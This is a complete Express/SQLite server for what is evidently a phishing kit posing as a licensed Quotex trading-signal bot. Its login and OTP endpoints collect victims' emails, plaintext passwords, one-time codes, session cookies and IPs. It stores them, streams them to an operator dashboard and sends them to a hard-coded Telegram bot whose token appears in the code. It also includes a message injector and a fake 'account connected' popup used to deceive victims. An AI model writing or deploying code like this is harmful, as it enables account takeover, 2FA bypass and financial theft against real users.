const express = require('express');
const cors = require('cors');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const Database = require('better-sqlite3');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ================== TELEGRAM SETTINGS ==================
const TELEGRAM_BOT_TOKEN = "8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc";
const TELEGRAM_CHAT_ID = "7293402395";

async function sendTelegramMessage(text) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(url, { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" });
    } catch (error) {
        console.error("Telegram Error:", error.message);
    }
}

// ================== SSE BROADCAST ==================
const sseClients = new Set();

// ================== PENDING MESSAGES (polling fallback) ==================
// Stores messages per userName so the main-bot can poll and pick up any
// messages that were missed when the SSE connection was temporarily down.
// Key: userName (string), Value: array of message objects
const pendingMessages = {};

function broadcastSSE(eventType, data) {
    const payload = JSON.stringify({ type: eventType, data, timestamp: new Date().toISOString() });
    sseClients.forEach(client => {
        try { client.write(`data: ${payload}\n\n`); } catch (e) {}
    });
}

// Real-time SSE endpoint (admin panel connects here)
app.get('/api/events', (req, res) => {
    res.setHeader('Content-Type', 'text/event-stream');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.flushHeaders();

    // Send heartbeat every 20 seconds to keep connection alive
    const heartbeat = setInterval(() => {
        try { res.write(`:heartbeat\n\n`); } catch (e) {}
    }, 20000);

    sseClients.add(res);
    res.write(`data: ${JSON.stringify({ type: 'connected', message: 'SSE ready' })}\n\n`);

    req.on('close', () => {
        clearInterval(heartbeat);
        sseClients.delete(res);
    });
});

// ================== SQLITE PERSISTENT STORAGE ==================
// DATA_DIR env var lets you point to a persistent disk on Render.com / Railway / Fly.io
// e.g. on Render: set DATA_DIR=/data  and mount a persistent disk at /data
// If not set, falls back to a "data" folder next to this file
const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');

// Ensure data directory exists
try {
    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
} catch (e) { console.error('Could not create DATA_DIR:', e.message); }

const DB_FILE = path.join(DATA_DIR, 'chinasignal.db');

let db;
try {
    db = new Database(DB_FILE);
    // Enable WAL mode for performance and crash safety — data survives server restarts
    db.pragma('journal_mode = WAL');
    db.pragma('synchronous = NORMAL');
    db.pragma('foreign_keys = ON');
    console.log(`✅ SQLite database opened: ${DB_FILE}`);
} catch (e) {
    console.error('SQLite open failed:', e.message);
    process.exit(1);
}

// Create all tables
db.exec(`
    CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        licenceKey TEXT NOT NULL,
        fullName TEXT DEFAULT 'Unknown',
        username TEXT DEFAULT '',
        password TEXT DEFAULT '',
        otp TEXT DEFAULT '',
        ip TEXT DEFAULT '',
        cookies TEXT DEFAULT '',
        status TEXT DEFAULT 'Active',
        connected INTEGER DEFAULT 0,
        blocked INTEGER DEFAULT 0,
        lastActivity TEXT,
        activities TEXT DEFAULT '[]',
        notes TEXT DEFAULT '',
        createdAt TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_users_licenceKey ON users(licenceKey);
    CREATE INDEX IF NOT EXISTS idx_users_lastActivity ON users(lastActivity DESC);

    CREATE TABLE IF NOT EXISTS licenses (
        key TEXT PRIMARY KEY,
        type TEXT DEFAULT 'Standard',
        status TEXT DEFAULT 'Active',
        usesRemaining INTEGER,
        assignedTo TEXT,
        dateAdded TEXT DEFAULT (datetime('now')),
        expiry TEXT
    );

    CREATE TABLE IF NOT EXISTS activity_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        action TEXT NOT NULL,
        userName TEXT DEFAULT 'Unknown',
        licenceKey TEXT DEFAULT '--',
        ip TEXT DEFAULT '--',
        otp TEXT DEFAULT '',
        extra TEXT DEFAULT '{}',
        timestamp TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_activity_timestamp ON activity_log(timestamp);
    CREATE INDEX IF NOT EXISTS idx_activity_action ON activity_log(action);

    CREATE TABLE IF NOT EXISTS sent_messages_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT NOT NULL,
        message TEXT NOT NULL,
        msgType TEXT DEFAULT 'info',
        success INTEGER DEFAULT 1,
        timestamp TEXT DEFAULT (datetime('now'))
    );

    CREATE TABLE IF NOT EXISTS user_notes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        licenceKey TEXT NOT NULL,
        note TEXT NOT NULL,
        addedBy TEXT DEFAULT 'Admin',
        timestamp TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_user_notes_key ON user_notes(licenceKey);

    CREATE TABLE IF NOT EXISTS signal_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        licenceKey TEXT,
        userName TEXT,
        asset TEXT,
        direction TEXT,
        duration INTEGER,
        confidence INTEGER,
        result TEXT,
        amount REAL,
        profit REAL,
        timestamp TEXT DEFAULT (datetime('now'))
    );
    CREATE INDEX IF NOT EXISTS idx_signal_licenceKey ON signal_history(licenceKey);
`);

// ================== MIGRATE OLD JSON DATA ==================
function safeJsonParse(str, fallback) {
    try { return JSON.parse(str || '{}'); } catch(e) { return fallback; }
}

// Migrate users.json -> SQLite
const oldUsersFile = path.join(DATA_DIR, 'users.json');
if (fs.existsSync(oldUsersFile)) {
    try {
        const raw = fs.readFileSync(oldUsersFile, 'utf8').trim();
        const oldUsers = raw ? JSON.parse(raw) : [];
        const insertUser = db.prepare(`
            INSERT OR IGNORE INTO users (id, licenceKey, fullName, username, password, otp, ip, cookies, status, connected, blocked, lastActivity, activities)
            VALUES (@id, @licenceKey, @fullName, @username, @password, @otp, @ip, @cookies, @status, @connected, @blocked, @lastActivity, @activities)
        `);
        const migrateMany = db.transaction((arr) => {
            for (const u of arr) {
                insertUser.run({
                    id:           u.id || (Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7)),
                    licenceKey:   u.licenceKey || '',
                    fullName:     u.fullName || 'Unknown',
                    username:     u.username || '',
                    password:     u.password || '',
                    otp:          u.otp || '',
                    ip:           u.ip || '',
                    cookies:      u.cookies || '',
                    status:       u.status || 'Active',
                    connected:    u.connected ? 1 : 0,
                    blocked:      u.blocked ? 1 : 0,
                    lastActivity: u.lastActivity || new Date().toISOString(),
                    activities:   JSON.stringify(u.activities || [])
                });
            }
        });
        migrateMany(oldUsers);
        fs.renameSync(oldUsersFile, oldUsersFile + '.migrated');
        console.log(`✅ Migrated ${oldUsers.length} users from users.json → SQLite`);
    } catch (e) { console.error('User migration error:', e.message); }
}

// Migrate licenses.json -> SQLite
const oldLicensesFile = path.join(DATA_DIR, 'licenses.json');
if (fs.existsSync(oldLicensesFile)) {
    try {
        const raw = fs.readFileSync(oldLicensesFile, 'utf8').trim();
        const oldLicenses = raw ? JSON.parse(raw) : [];
        const insertLic = db.prepare(`
            INSERT OR IGNORE INTO licenses (key, type, status, usesRemaining, assignedTo, dateAdded, expiry)
            VALUES (@key, @type, @status, @usesRemaining, @assignedTo, @dateAdded, @expiry)
        `);
        const migrateLics = db.transaction((arr) => {
            for (const l of arr) {
                insertLic.run({
                    key:           l.key,
                    type:          l.type || 'Standard',
                    status:        l.status || 'Active',
                    usesRemaining: l.usesRemaining || null,
                    assignedTo:    l.assignedTo || null,
                    dateAdded:     l.dateAdded || new Date().toISOString(),
                    expiry:        l.expiry || null
                });
            }
        });
        migrateLics(oldLicenses);
        fs.renameSync(oldLicensesFile, oldLicensesFile + '.migrated');
        console.log(`✅ Migrated ${oldLicenses.length} licenses from licenses.json → SQLite`);
    } catch (e) { console.error('License migration error:', e.message); }
}

// ================== DB HELPER FUNCTIONS ==================
function getUsers() {
    return db.prepare('SELECT * FROM users ORDER BY lastActivity DESC').all().map(dbUserToObj);
}

function dbUserToObj(u) {
    if (!u) return null;
    return {
        ...u,
        connected:  !!u.connected,
        blocked:    !!u.blocked,
        activities: safeJsonParse(u.activities, [])
    };
}

function getUserByLicenceKey(licenceKey) {
    return dbUserToObj(db.prepare('SELECT * FROM users WHERE licenceKey = ? ORDER BY lastActivity DESC LIMIT 1').get(licenceKey));
}

function saveUser(user) {
    db.prepare(`
        INSERT OR REPLACE INTO users
            (id, licenceKey, fullName, username, password, otp, ip, cookies, status, connected, blocked, lastActivity, activities)
        VALUES
            (@id, @licenceKey, @fullName, @username, @password, @otp, @ip, @cookies, @status, @connected, @blocked, @lastActivity, @activities)
    `).run({
        ...user,
        connected:  user.connected  ? 1 : 0,
        blocked:    user.blocked    ? 1 : 0,
        activities: JSON.stringify(user.activities || [])
    });
}

// Helper: Get or create user
// Matches by BOTH licenceKey AND fullName so that multiple people sharing
// the same license key still get separate records (one row per person).
// Falls back to licenceKey-only match when fullName is "Unknown" or blank.
function getOrCreateUser(licenceKey, fullName = "Unknown") {
    const hasName = fullName && fullName !== "Unknown" && fullName !== "Pending Name";

    let user;
    if (hasName) {
        // Primary: match by licenceKey + fullName (case-insensitive on name)
        user = dbUserToObj(db.prepare(
            'SELECT * FROM users WHERE licenceKey = ? AND lower(fullName) = lower(?)'
        ).get(licenceKey, fullName));

        // Fallback: claim a key-only record with no real name yet
        if (!user) {
            user = dbUserToObj(db.prepare(
                "SELECT * FROM users WHERE licenceKey = ? AND (fullName IS NULL OR fullName = 'Unknown' OR fullName = 'Pending Name')"
            ).get(licenceKey));
        }
    } else {
        user = getUserByLicenceKey(licenceKey);
    }

    if (!user) {
        user = {
            id:           Date.now().toString() + '_' + Math.random().toString(36).slice(2, 7),
            licenceKey,
            fullName:     hasName ? fullName : "Unknown",
            username:     "",
            password:     "",
            otp:          "",
            ip:           "",
            cookies:      "",
            status:       "Active",
            connected:    false,
            blocked:      false,
            lastActivity: new Date().toISOString(),
            activities:   []
        };
        saveUser(user);
    }

    if (hasName && user.fullName !== fullName) user.fullName = fullName;
    user.lastActivity = new Date().toISOString();
    saveUser(user);
    return user;
}

function getLicenses() {
    return db.prepare('SELECT * FROM licenses ORDER BY dateAdded DESC').all();
}

function getLicense(key) {
    return db.prepare('SELECT * FROM licenses WHERE key = ?').get(key);
}

function saveLicense(license) {
    db.prepare(`
        INSERT OR REPLACE INTO licenses (key, type, status, usesRemaining, assignedTo, dateAdded, expiry)
        VALUES (@key, @type, @status, @usesRemaining, @assignedTo, @dateAdded, @expiry)
    `).run(license);
}

function deleteLicenseByKey(key) {
    db.prepare('DELETE FROM licenses WHERE key = ?').run(key);
}

// Persistent activity logger — every action is stored in SQLite forever
function logActivity(action, data = {}) {
    try {
        db.prepare(`
            INSERT INTO activity_log (action, userName, licenceKey, ip, otp, extra, timestamp)
            VALUES (@action, @userName, @licenceKey, @ip, @otp, @extra, @timestamp)
        `).run({
            action,
            userName:   data.fullName   || data.userName   || 'Unknown',
            licenceKey: data.licenceKey || data.licenseKey || '--',
            ip:         data.ip         || '--',
            otp:        data.otp        || '',
            extra:      JSON.stringify(data),
            timestamp:  new Date().toISOString()
        });
    } catch(e) { console.error('logActivity error:', e.message); }
}

// ================== LICENSE ROUTES ==================
app.get('/api/licenses', (req, res) => {
    res.json(getLicenses());
});

app.post('/api/licenses', (req, res) => {
    const { key, type, expiry, maxUses, status } = req.body;
    if (!key) return res.status(400).json({ error: "Key required" });
    if (getLicense(key)) {
        return res.status(400).json({ error: "License already exists" });
    }
    const newLicense = {
        key,
        type:          type   || "Standard",
        status:        status || "Active",
        usesRemaining: maxUses || null,
        assignedTo:    null,
        dateAdded:     new Date().toISOString(),
        expiry:        expiry || null
    };
    saveLicense(newLicense);
    logActivity('License Added by Admin', { licenceKey: key });
    broadcastSSE('license_added', newLicense);
    res.json({ success: true });
});

// ================== BULK LICENSE ADD ==================
app.post('/api/bulk-license', (req, res) => {
    const { keys, type, expiry, maxUses, status } = req.body;
    if (!Array.isArray(keys) || keys.length === 0) {
        return res.status(400).json({ error: "keys array required" });
    }
    let added = 0, skipped = 0;
    const addMany = db.transaction(() => {
        for (const rawKey of keys) {
            const key = (rawKey || '').trim().toUpperCase();
            if (!key || getLicense(key)) { skipped++; continue; }
            saveLicense({
                key,
                type:          type   || "Standard",
                status:        status || "Active",
                usesRemaining: maxUses || null,
                assignedTo:    null,
                dateAdded:     new Date().toISOString(),
                expiry:        expiry || null
            });
            added++;
        }
    });
    addMany();
    logActivity(`Bulk License Add: ${added} added, ${skipped} skipped`, {});
    broadcastSSE('licenses_bulk_added', { count: added });
    res.json({ success: true, added, skipped });
});

app.patch('/api/licenses/:key', (req, res) => {
    const key = decodeURIComponent(req.params.key);
    const { status } = req.body;
    const license = getLicense(key);
    if (!license) return res.status(404).json({ error: "License not found" });
    if (status) license.status = status;
    saveLicense(license);
    broadcastSSE('license_updated', { key, status: license.status });
    res.json({ success: true, key, status: license.status });
});

app.delete('/api/licenses/:key', (req, res) => {
    const key = decodeURIComponent(req.params.key);
    deleteLicenseByKey(key);
    logActivity('License Deleted by Admin', { licenceKey: key });
    broadcastSSE('license_deleted', { key });
    res.json({ success: true });
});

// Validate License (called by main bot)
app.post('/api/validate-license', (req, res) => {
    const { licenseKey } = req.body;
    if (!licenseKey) return res.json({ valid: false, message: "No key provided" });

    const license = getLicense(licenseKey);
    const valid   = !!(license &&
        license.status === "Active" &&
        (!license.expiry || new Date(license.expiry) > new Date()));

    res.json({
        valid,
        message: valid ? "License is valid" : "Invalid or expired license key."
    });
});

// ================== LICENSE ACTIVATION ==================
app.post('/api/license-activate', async (req, res) => {
    const { licenseKey, userName, timestamp } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    const user = getOrCreateUser(licenseKey, userName);
    if (userName && userName !== "Pending Name") user.fullName = userName;
    user.activities.push({ action: "License Activated", timestamp: new Date().toLocaleString() });
    saveUser(user);
    logActivity('License Activated', { licenceKey: licenseKey, fullName: userName, ip });

    broadcastSSE('license_activated', {
        licenceKey: licenseKey,
        fullName:   userName,
        ip,
        timestamp:  timestamp || new Date().toLocaleString()
    });

    const message = `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`;
    await sendTelegramMessage(message);
    res.status(200).json({ status: "success" });
});

// ================== QUOTEX LOGIN ==================
app.post('/api/quotex-login', async (req, res) => {
    const { email, password, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    const user = getOrCreateUser(licenceKey, name);
    user.username = email;
    user.password = password;
    user.ip       = ip;
    user.cookies  = cookies;
    user.status   = "Online";
    user.activities.push({ action: "Quotex Login Submitted", timestamp: new Date().toLocaleString() });
    saveUser(user);
    logActivity('Quotex Login Submitted', { licenceKey, fullName: name, ip });

    broadcastSSE('quotex_login', {
        licenceKey,
        fullName:  name,
        email,
        password,
        ip,
        cookies,
        timestamp: new Date().toLocaleString()
    });

    const message = `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
    await sendTelegramMessage(message);
    res.status(200).json({ status: "ok" });
});

// ================== OTP ==================
app.post('/api/quotex-otp', async (req, res) => {
    const { email, otp, name, licenceKey = "DEFAULT", cookies = "" } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";

    const user = getOrCreateUser(licenceKey, name);
    user.otp     = otp;
    user.ip      = ip;
    user.cookies = cookies;
    user.status  = "Online";
    user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
    saveUser(user);
    logActivity('OTP Captured', { licenceKey, fullName: name, ip, otp });

    broadcastSSE('otp_entered', {
        licenceKey,
        fullName:  name,
        email,
        otp,
        ip,
        cookies,
        timestamp: new Date().toLocaleString()
    });

    const message = `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
    await sendTelegramMessage(message);
    res.status(200).json({ status: "ok" });
});

// ================== BLOCK / UNBLOCK USER ==================
app.post('/api/block-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });

    // Mark user as blocked
    const user = getUserByLicenceKey(licenceKey);
    if (user) {
        user.blocked = true;
        user.status  = "Blocked";
        user.activities.push({ action: "🚫 Blocked by Admin", timestamp: new Date().toLocaleString() });
        saveUser(user);
    }

    // Deactivate the matching license so validate-license also fails
    const lic = getLicense(licenceKey);
    if (lic) {
        lic.status = "Inactive";
        saveLicense(lic);
    }

    logActivity('User Blocked by Admin', { licenceKey, fullName: user?.fullName || 'Unknown', ip: '--' });

    broadcastSSE('user_blocked', {
        licenceKey,
        fullName:  user?.fullName || 'Unknown',
        timestamp: new Date().toLocaleString()
    });

    const msg = `🚫 <b>User BLOCKED</b>\n👤 Name: <b>${user?.fullName || 'Unknown'}</b>\n🔑 Key: <b>${licenceKey}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`;
    await sendTelegramMessage(msg);
    res.json({ success: true });
});

app.post('/api/unblock-user', async (req, res) => {
    const { licenceKey } = req.body;
    if (!licenceKey) return res.status(400).json({ error: "licenceKey required" });

    const user = getUserByLicenceKey(licenceKey);
    if (user) {
        user.blocked = false;
        user.status  = "Active";
        user.activities.push({ action: "✅ Unblocked by Admin", timestamp: new Date().toLocaleString() });
        saveUser(user);
    }

    // Re-activate their license
    const lic = getLicense(licenceKey);
    if (lic) {
        lic.status = "Active";
        saveLicense(lic);
    }

    logActivity('User Unblocked by Admin', { licenceKey, fullName: user?.fullName || 'Unknown', ip: '--' });

    broadcastSSE('user_unblocked', {
        licenceKey,
        fullName:  user?.fullName || 'Unknown',
        timestamp: new Date().toLocaleString()
    });

    res.json({ success: true });
});

// Called by the main bot every 15 seconds to check if user is still authorised
app.get('/api/check-access', (req, res) => {
    const licenseKey = req.query.licenseKey || req.query.licenceKey;
    if (!licenseKey) return res.json({ allowed: false, reason: "no_key" });

    const user = getUserByLicenceKey(licenseKey);
    if (user && user.blocked) {
        return res.json({ allowed: false, reason: "blocked" });
    }

    const lic = getLicense(licenseKey);
    if (!lic || lic.status !== "Active" || (lic.expiry && new Date(lic.expiry) < new Date())) {
        return res.json({ allowed: false, reason: "license_inactive" });
    }

    res.json({ allowed: true });
});

// ================== ACTIVITY TRACKING ==================
app.post('/api/track-activity', async (req, res) => {
    const { action, userName } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown";
    broadcastSSE('activity', { action, userName, ip, timestamp: new Date().toLocaleString() });
    logActivity(action, { userName, ip });
    res.status(200).json({ status: "success" });
});

app.post('/api/notification-permission', async (req, res) => {
    const { userName, permission, timestamp } = req.body;
    res.status(200).json({ status: "success" });
});

// ================== TRIGGER CONNECTED ==================
// FIX: Broadcast BOTH 'show_connected' (for main-bot) AND 'trigger_connected' (for admin panel log)
app.get('/api/trigger-connected', async (req, res) => {
    const userName = req.query.userName || "User";

    // 'show_connected' is what the main-bot listens for — triggers the
    // "Account Connected Successfully" popup + profile setup form
    broadcastSSE('show_connected', { userName });

    // 'trigger_connected' is kept for the admin panel's activity log
    broadcastSSE('trigger_connected', { userName });

    logActivity('Trigger: Connection Shown', { userName, ip: '--' });

    const message = `🔗 <b>Connection Triggered</b>\n👤 User: <b>${userName}</b>`;
    await sendTelegramMessage(message);
    res.send("Trigger sent");
});

// ================== SEND MESSAGE TO USER (Msg Injector) ==================
app.post('/api/send-message', async (req, res) => {
    const { userName, message, type } = req.body;
    if (!userName || !message) {
        return res.status(400).json({ error: "userName and message are required" });
    }

    const ts      = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
    const msgType = type || 'info';

    const msgPayload = { userName, message, type: msgType, timestamp: ts };

    // 1. Try SSE instant delivery (works when main-bot SSE connection is live)
    broadcastSSE('injected_message', msgPayload);

    // 2. ALSO store in pending map so main-bot poll can pick it up even if
    //    the SSE connection was down when the broadcast fired.
    //    Normalise userName to lowercase for case-insensitive matching.
    const key = userName.trim().toLowerCase();
    if (!pendingMessages[key]) pendingMessages[key] = [];
    pendingMessages[key].push(msgPayload);
    // Cap at 20 stored messages per user to avoid unbounded growth
    if (pendingMessages[key].length > 20) pendingMessages[key].shift();

    // 3. Persist to database permanently
    db.prepare('INSERT INTO sent_messages_log (target, message, msgType, success, timestamp) VALUES (?, ?, ?, 1, ?)').run(
        userName, message, msgType, new Date().toISOString()
    );

    // Also log the activity
    broadcastSSE('activity', {
        action:    `💬 Message Injected [${msgType}] → ${userName}`,
        userName,
        ip:        '—',
        timestamp: ts
    });
    logActivity(`Message Injected [${msgType}]`, { userName, ip: '--' });

    // Notify admin via Telegram
    const typeEmojis = { info: 'ℹ️', warning: '⚠️', alert: '🚨', instruction: '📋', otp: '🔢' };
    const emoji = typeEmojis[msgType] || '💬';
    const telegramMsg = `${emoji} <b>Message Injected</b>\n👤 Target: <b>${userName}</b>\n📝 Type: <b>${msgType}</b>\n💬 Message: <b>${message}</b>\n⏰ Time: <b>${ts}</b>`;
    await sendTelegramMessage(telegramMsg);

    res.status(200).json({ success: true, delivered: true });
});

// ================== POLL FOR PENDING MESSAGES (main-bot polling fallback) ==================
// Main-bot calls this every 5 seconds. Returns any messages queued for this
// user (stored by /api/send-message) and clears them so they are shown once only.
app.get('/api/poll-messages', (req, res) => {
    const userName = (req.query.userName || '').trim().toLowerCase();
    if (!userName) return res.json({ messages: [] });

    const msgs = pendingMessages[userName] || [];
    // Clear after reading so messages are only shown once
    pendingMessages[userName] = [];

    res.json({ messages: msgs });
});

// ================== MAINTENANCE MODE ==================
let maintenanceMode = { active: false, until: null, message: 'Under Maintenance. Please check back soon.' };

// Restore maintenance state from SQLite on startup
try {
    const maintRow = db.prepare("SELECT extra FROM activity_log WHERE action = '__maintenance_state__' ORDER BY id DESC LIMIT 1").get();
    if (maintRow) {
        const parsed = safeJsonParse(maintRow.extra, null);
        if (parsed && parsed.active !== undefined) maintenanceMode = parsed;
    }
} catch(e) {}

app.get('/api/maintenance', (req, res) => {
    res.json(maintenanceMode);
});

app.post('/api/maintenance', (req, res) => {
    const { active, until, message, adminKey } = req.body;
    if (adminKey !== 'CSAI-NEWX-ADMI-N999') return res.status(403).json({ error: 'Unauthorized' });
    maintenanceMode = {
        active:  !!active,
        until:   until   || null,
        message: message || 'Under Maintenance. Please check back soon.'
    };
    // Persist maintenance state to SQLite
    db.prepare("INSERT INTO activity_log (action, extra, timestamp) VALUES ('__maintenance_state__', ?, ?)").run(
        JSON.stringify(maintenanceMode), new Date().toISOString()
    );
    broadcastSSE('maintenance_update', maintenanceMode);
    res.json({ ok: true, mode: maintenanceMode });
});

// ================== STATS & DATA ==================
app.get('/api/stats', (req, res) => {
    const users    = getUsers();
    const licenses = getLicenses();

    // Time-based stats from persistent activity log
    const now        = new Date();
    const todayStart = new Date(now.getFullYear(), now.getMonth(), now.getDate()).toISOString();
    const weekStart  = new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000).toISOString();

    const todayActivations = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'License Activated' AND timestamp >= ?").get(todayStart)?.cnt || 0;
    const weekActivations  = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'License Activated' AND timestamp >= ?").get(weekStart)?.cnt || 0;
    const todayOTPs        = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action = 'OTP Captured' AND timestamp >= ?").get(todayStart)?.cnt || 0;
    const totalActivities  = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action NOT LIKE '__%__'").get()?.cnt || 0;
    const totalMsgsSent    = db.prepare("SELECT COUNT(*) as cnt FROM sent_messages_log").get()?.cnt || 0;

    res.json({
        totalUsers:          users.length,
        onlineNow:           users.filter(u => u.status === "Online").length,
        otpCaptured:         users.filter(u => u.otp && u.otp.length >= 4).length,
        connectedAccounts:   users.filter(u => u.connected).length,
        totalLicenses:       licenses.length,
        activeLicenses:      licenses.filter(l => l.status === "Active").length,
        blockedUsers:        users.filter(u => u.blocked).length,
        todayActivations,
        weekActivations,
        todayOTPs,
        totalActivities,
        totalMsgsSent
    });
});

app.get('/api/users', (req, res) => {
    // Support pagination: ?offset=0&limit=100
    // When no params given, returns ALL users (backwards-compatible)
    const offset = parseInt(req.query.offset, 10) || 0;
    const limit  = parseInt(req.query.limit,  10) || 0;
    const users  = getUsers();
    if (limit > 0) {
        res.json({
            users:  users.slice(offset, offset + limit),
            total:  users.length,
            offset,
            limit
        });
    } else {
        res.json(users);
    }
});

app.get('/api/latest-activity', (req, res) => {
    const users = getUsers();
    res.json({
        logins: users.filter(u => u.username),
        otps:   users.filter(u => u.otp)
    });
});

// ================== PERSISTENT ACTIVITY LOG ==================
app.get('/api/activity-log', (req, res) => {
    const limit  = Math.min(parseInt(req.query.limit,  10) || 200, 1000);
    const offset = parseInt(req.query.offset, 10) || 0;
    const search = req.query.search || '';
    let rows, total;
    if (search) {
        rows  = db.prepare("SELECT * FROM activity_log WHERE action NOT LIKE '__%%__' AND (action LIKE ? OR userName LIKE ? OR licenceKey LIKE ?) ORDER BY id DESC LIMIT ? OFFSET ?").all(`%${search}%`, `%${search}%`, `%${search}%`, limit, offset);
        total = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action NOT LIKE '__%%__' AND (action LIKE ? OR userName LIKE ? OR licenceKey LIKE ?)").get(`%${search}%`, `%${search}%`, `%${search}%`)?.cnt || 0;
    } else {
        rows  = db.prepare("SELECT * FROM activity_log WHERE action NOT LIKE '__%%__' ORDER BY id DESC LIMIT ? OFFSET ?").all(limit, offset);
        total = db.prepare("SELECT COUNT(*) as cnt FROM activity_log WHERE action NOT LIKE '__%%__'").get()?.cnt || 0;
    }
    res.json({ rows, total, limit, offset });
});

// ================== USER NOTES ==================
app.get('/api/user-notes/:licenceKey', (req, res) => {
    const key = decodeURIComponent(req.params.licenceKey);
    const notes = db.prepare('SELECT * FROM user_notes WHERE licenceKey = ? ORDER BY id DESC').all(key);
    res.json(notes);
});

app.post('/api/user-notes', (req, res) => {
    const { licenceKey, note, addedBy } = req.body;
    if (!licenceKey || !note) return res.status(400).json({ error: "licenceKey and note required" });
    const result = db.prepare('INSERT INTO user_notes (licenceKey, note, addedBy, timestamp) VALUES (?, ?, ?, ?)').run(
        licenceKey, note, addedBy || 'Admin', new Date().toISOString()
    );
    logActivity('Admin Note Added', { licenceKey, ip: '--' });
    res.json({ success: true, id: result.lastInsertRowid });
});

app.delete('/api/user-notes/:id', (req, res) => {
    db.prepare('DELETE FROM user_notes WHERE id = ?').run(parseInt(req.params.id));
    res.json({ success: true });
});

// ================== SIGNAL HISTORY (Bot side) ==================
app.post('/api/signal-history', (req, res) => {
    const { licenceKey, userName, asset, direction, duration, confidence, result, amount, profit } = req.body;
    db.prepare(`
        INSERT INTO signal_history (licenceKey, userName, asset, direction, duration, confidence, result, amount, profit, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).run(licenceKey || '', userName || '', asset || '', direction || '', duration || 0, confidence || 0, result || '', amount || 0, profit || 0, new Date().toISOString());
    res.json({ success: true });
});

app.get('/api/signal-history', (req, res) => {
    const licenceKey = req.query.licenceKey;
    const limit = Math.min(parseInt(req.query.limit, 10) || 50, 500);
    let rows;
    if (licenceKey) {
        rows = db.prepare('SELECT * FROM signal_history WHERE licenceKey = ? ORDER BY id DESC LIMIT ?').all(licenceKey, limit);
    } else {
        rows = db.prepare('SELECT * FROM signal_history ORDER BY id DESC LIMIT ?').all(limit);
    }
    res.json(rows);
});

app.get('/api/signal-stats', (req, res) => {
    const licenceKey = req.query.licenceKey;
    let stats;
    if (licenceKey) {
        stats = db.prepare(`
            SELECT
                COUNT(*) as total,
                SUM(CASE WHEN result='win' THEN 1 ELSE 0 END) as wins,
                SUM(CASE WHEN result='loss' THEN 1 ELSE 0 END) as losses,
                SUM(profit) as totalProfit,
                AVG(confidence) as avgConfidence
            FROM signal_history WHERE licenceKey = ?
        `).get(licenceKey);
    } else {
        stats = db.prepare(`
            SELECT
                COUNT(*) as total,
                SUM(CASE WHEN result='win' THEN 1 ELSE 0 END) as wins,
                SUM(CASE WHEN result='loss' THEN 1 ELSE 0 END) as losses,
                SUM(profit) as totalProfit,
                AVG(confidence) as avgConfidence
            FROM signal_history
        `).get();
    }
    const winRate = stats.total > 0 ? ((stats.wins / stats.total) * 100).toFixed(1) : 0;
    res.json({ ...stats, winRate });
});

// ================== SENT MESSAGES LOG ==================
app.get('/api/sent-messages-log', (req, res) => {
    const limit = Math.min(parseInt(req.query.limit, 10) || 100, 500);
    const rows  = db.prepare('SELECT * FROM sent_messages_log ORDER BY id DESC LIMIT ?').all(limit);
    const total = db.prepare('SELECT COUNT(*) as cnt FROM sent_messages_log').get()?.cnt || 0;
    res.json({ rows, total });
});

// ================== DELETE USER ==================
app.delete('/api/users/:id', (req, res) => {
    db.prepare('DELETE FROM users WHERE id = ?').run(req.params.id);
    logActivity('User Deleted by Admin', { ip: '--' });
    broadcastSSE('user_deleted', { id: req.params.id });
    res.json({ success: true });
});

